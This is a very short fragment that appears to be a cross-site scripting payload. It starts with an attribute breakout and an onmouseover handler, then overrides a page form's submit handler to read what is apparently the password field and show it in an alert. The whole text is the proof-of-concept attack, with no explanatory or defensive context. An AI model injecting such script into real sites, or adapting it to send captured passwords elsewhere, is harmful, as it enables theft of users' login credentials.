" onmouseover ="

document.forms[0].onsubmit = function formSubmit() {
  var pass = document.forms[0].elements[1].value;
  alert(pass);

}
